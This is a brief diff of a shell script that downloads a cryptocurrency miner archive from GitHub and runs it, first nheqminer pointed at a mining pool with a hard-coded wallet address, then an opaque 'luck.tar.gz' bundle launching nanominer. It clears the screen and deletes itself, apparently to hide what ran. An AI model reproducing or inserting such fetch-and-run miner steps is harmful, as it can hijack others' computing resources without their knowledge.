@@ -4,9 +4,9 @@ if [ $? -eq 0 ]; then
   clear
   rm -- "$0"
 else
-  wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-  tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-  nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4
+  wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz
+  tar -xvf luck.tar.gz
+  ./nanominer
   clear
   rm -- "$0"
 fi
